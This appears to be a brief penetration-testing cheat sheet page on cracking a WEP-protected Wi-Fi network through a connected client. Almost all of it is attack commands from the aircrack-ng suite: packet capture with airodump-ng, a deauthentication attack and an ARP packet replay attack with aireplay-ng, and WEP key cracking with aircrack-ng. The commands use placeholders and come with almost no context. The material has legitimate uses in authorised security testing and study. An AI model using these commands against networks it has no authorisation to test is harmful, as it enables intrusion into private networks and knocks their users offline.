# via a client

#### Capture + output as wep-01.pcap

{% code overflow="wrap" %}
```
# -c channel -w output filename = recon-0#
sudo airodump-ng -c # --essid AP_NAME --bssid XX:XX:XX:XX:XX:XX -w wep --output-format pcap wlan0mon
```
{% endcode %}

#### Attack

Deauth the AP

```
aireplay-ng -0 1 -e <ESSID> -a <AP MAC> -w <capture> <interface>
```

Launch the interactive packet replay attack looking for ARP packets coming from the AP:

{% code overflow="wrap" %}
```

aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
```
{% endcode %}

Once enough IVs have been captured, crack the WEP key:

```
aircrack-ng -z <capture>
```
